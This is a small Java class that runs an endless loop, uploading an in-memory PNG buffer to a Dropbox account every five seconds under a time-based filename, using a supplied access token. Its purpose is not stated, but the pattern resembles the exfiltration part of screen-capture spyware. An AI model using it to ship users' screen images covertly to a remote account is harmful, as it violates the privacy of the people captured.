package com.home;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
public class My_Thread extends Thread {
    private ByteArrayOutputStream os;
    private String Time;
    private String Token;
    public My_Thread( ByteArrayOutputStream buff, String time, String token){
        os  = buff;
        Time = time;
        Token = token; }@Override
    public void run()  {
        for (;;){
            String ACCESS_TOKEN =Token;
            DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
            DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
            try { InputStream in = new ByteArrayInputStream(os.toByteArray()) ;
                client.files().uploadBuilder("/"+Time +".png")
                        .uploadAndFinish(in); }
            catch (Exception ex){ ex.printStackTrace(); }
            try { sleep(5_000);
            } catch (InterruptedException e) {
                e.printStackTrace(); }
            super.run(); }}}

